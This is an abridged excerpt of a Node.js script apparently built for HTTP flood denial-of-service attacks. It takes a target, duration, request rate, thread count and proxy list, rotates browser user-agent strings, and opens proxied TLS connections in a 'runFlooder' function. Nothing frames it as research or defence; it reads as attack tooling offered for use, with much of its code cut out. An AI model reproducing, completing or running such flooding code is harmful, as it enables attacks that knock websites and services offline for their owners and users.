const net = require("net");
 ...
 if (process.argv.length < 8){console.log(`node raw <target> <time> <rate> <thread> <proxy>`);}
 const headers = {};
 ...
 const uap = [
     ...
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60 Viewer/97.9.8898.99",
     ...
     "Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5935.119 Safari/537.36",
 ...
 function runFlooder() {
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         const tlsOptions = {
            ...
            secureProtocol: ["TLS_method", "TLSv1_0_method" ,"TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"]
        };
...
console.clear()
 ...
 console.log(`[!] Status: Success!`.bold)
